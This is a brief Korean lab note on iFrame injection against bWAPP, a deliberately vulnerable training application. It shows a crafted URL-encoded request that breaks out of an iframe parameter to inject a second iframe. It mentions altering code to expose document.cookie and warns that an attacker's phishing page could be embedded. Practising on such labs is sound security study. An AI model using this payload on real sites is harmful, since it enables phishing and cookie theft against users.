# iFrame Injection

코드 수정: `(document.cookie);` 로 수정

요청 예시:

```
http://192.168.56.122/bWAPP/iframei.php?ParamUrl=robots.txt%22%3E%3C/iframe%3E%3Ciframe%20src=%22code.html%22%20width=%22250%22%20height=250%22%3E%3C/iframe%3E&ParamWidth=250&ParamHeight=250
```

{% hint style="info" %}
high 레벨에서는 작동하지 않는다.
{% endhint %}

{% hint style="warning" %}
공격자의 피싱 사이트를 넣을 수도 있다.
{% endhint %}
